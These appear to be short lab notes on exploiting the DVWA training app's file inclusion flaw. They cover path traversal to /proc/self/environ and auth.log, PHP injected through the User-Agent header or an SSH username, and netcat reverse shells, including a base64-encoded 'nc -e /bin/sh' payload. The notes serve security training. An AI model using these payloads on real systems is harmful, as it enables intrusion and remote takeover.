# DVWA

## File Inclusion
- Method 1
  1. *"USER_AGENT"* in in this file
     - ```[DVWA address]/dvwa/vulnerabilities/fi/?page=../../../../../proc/self/environ```
  2. Intercept request and modify *"USER_AGENT"* header for test
     - Burp path: Proxy -> Intercept -> Headers -> Modify 'User-Agent' value to ```<?phpinfo();?>``` 
  3. Listening on attacker machine
     - ```nc -vv -l -p 8888```
  4. Modify *"USER_AGENT"* header for Reverse-shell
     - ```<?passthru("nc -e /bin/sh [Attacker address] 8888");?>```

- Method 2
  1. SSH login attempts are in this file
     - ```[DVWA address]/dvwa/vulnerabilities/fi/?page=../../../../../var/log/auth.log```  
  2. Encode ```nc -e /bin/sh [Attacker address] 8888``` to Base64
  3. Attacker machine: ```nc -vv -l -p 8888```
  4. Attacker machine: ```ssh "<?passthru(base64_decode('bmMgLWUgL2Jpbi9zaCAxNzIuMjUuMTIuMzQgODg4OA=='));?>"@[DVWA address]```
